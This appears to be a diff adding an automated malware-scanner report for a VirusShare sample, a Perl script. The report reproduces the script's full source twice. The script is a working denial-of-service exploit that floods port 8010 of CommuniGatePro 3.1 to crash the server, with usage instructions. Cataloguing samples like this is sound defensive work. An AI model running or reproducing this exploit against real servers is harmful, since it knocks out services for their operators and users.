@@ -1,0 +1,77 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "#!/usr/bin/perl\n# :::::::::::::::::::::::::::::\n# :: r00tabega security labs ::\n# ::    www.r00tabega.com    ::\n# :::::::::::::::::::::::::::::\n#\n# DoS Attack against CommuniGatePro 3.1 for Windows NT\n# Exploit coded and discovered by bansh33 [bansh33@r00tabega.com]\n# \n# <advisory>\n# CommuniGate is an Internet messaging server application implementing\n# various services including SMTP, IMAP, and POP3.\n# It does, however, contain a simple buffer overflow as follows:\n# It listens for connections on port 8010 (http configuration from remote browser)\n# and crashes when sent 70,000 of \"a\" + \"\\r\\n\"\n# Solution: Upgrade to version 3.2\n# </advisory>\n#\n# <usage>\n# ./communigate.pl [remote server]\n# </usage>\n#\n# <greetz>\n# E-dub, Sys-Edit, ragnarox, sku||, Axtrex, busdr1v3r, Griffon, Tutor, Ashmodai\n# and my mommy and daddy cuz they make me drink my milk =)\n# </greetz>\n# \n# ---------------begin c0de-----------------------\nuse Socket;\nif (!($ARGV[0])) {\n\tprint \"CommuniGatePro 3.1 DoS Attack [bansh33@r00tabega.com]\\n\";\n  \tprint \"usage: ./communigate.pl [remote host]\\n\"; \n  \texit; \n}\nprint \"Attempting DOS Attack to $ARGV[0]...\\n\";\n$host = $ARGV[0];\n$serverIP = inet_aton($host);\n$serverAddr = sockaddr_in(8010, $serverIP);\nsocket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif(connect(CLIENT, $serverAddr)) {\nfor ($i = 0; $i < 70001; $i++) {\n\nsend(CLIENT,\"a\\r\\n\",0);\n}\nprint \"Packets sent.  If all went correctly, CommuniGatePro has crashed on $host\\n\";\nprint \"CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\\n\";\nprint \"[www.r00tabega.com]\\n\"\t\n}\t\nelse {\n\tprint \"Cannot connect to $host on port 8010!\\n\";\n\tprint \"CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\\n\";\n\tprint \"[www.r00tabega.com]\\n\"\t\n}\n#                    www.hack.co.za              [2000]#"
+    },
+    "filename": "VirusShare_035661916046333dfb1d7e1a49e6f9e6",
+    "filesize": 1867,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "035661916046333dfb1d7e1a49e6f9e6",
+        "sha1": "97c113f34af9cc7e922600f50e0d5ff8ee47b0c4",
+        "sha256": "414e83f72f61a6f34828986417e6d7e42dfca7083189316acc60fe0fa1661837"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# :::::::::::::::::::::::::::::",
+            "# :: r00tabega security labs ::",
+            "# ::    www.r00tabega.com    ::",
+            "# :::::::::::::::::::::::::::::",
+            "# DoS Attack against CommuniGatePro 3.1 for Windows NT",
+            "# Exploit coded and discovered by bansh33 [bansh33@r00tabega.com]",
+            "# <advisory>",
+            "# CommuniGate is an Internet messaging server application implementing",
+            "# various services including SMTP, IMAP, and POP3.",
+            "# It does, however, contain a simple buffer overflow as follows:",
+            "# It listens for connections on port 8010 (http configuration from remote browser)",
+            "# and crashes when sent 70,000 of \"a\" + \"\\r\\n\"",
+            "# Solution: Upgrade to version 3.2",
+            "# </advisory>",
+            "# <usage>",
+            "# ./communigate.pl [remote server]",
+            "# </usage>",
+            "# <greetz>",
+            "# E-dub, Sys-Edit, ragnarox, sku||, Axtrex, busdr1v3r, Griffon, Tutor, Ashmodai",
+            "# and my mommy and daddy cuz they make me drink my milk =)",
+            "# </greetz>",
+            "# ---------------begin c0de-----------------------",
+            "use Socket;",
+            "if (!($ARGV[0])) {",
+            "\tprint \"CommuniGatePro 3.1 DoS Attack [bansh33@r00tabega.com]\\n\";",
+            "  \tprint \"usage: ./communigate.pl [remote host]\\n\"; ",
+            "  \texit; ",
+            "print \"Attempting DOS Attack to $ARGV[0]...\\n\";",
+            "$host = $ARGV[0];",
+            "$serverIP = inet_aton($host);",
+            "$serverAddr = sockaddr_in(8010, $serverIP);",
+            "socket(CLIENT, PF_INET, SOCK_STREAM, getprotobyname('tcp'));",
+            "if(connect(CLIENT, $serverAddr)) {",
+            "for ($i = 0; $i < 70001; $i++) {",
+            "send(CLIENT,\"a\\r\\n\",0);",
+            "print \"Packets sent.  If all went correctly, CommuniGatePro has crashed on $host\\n\";",
+            "print \"CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\\n\";",
+            "print \"[www.r00tabega.com]\\n\"\t",
+            "else {",
+            "\tprint \"Cannot connect to $host on port 8010!\\n\";",
+            "\tprint \"CommuniGatePro 3.1 DoS Attack coded by bansh33 [bansh33@r00tabega.com]\\n\";",
+            "\tprint \"[www.r00tabega.com]\\n\"\t",
+            "#                    www.hack.co.za              [2000]#"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.326628",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
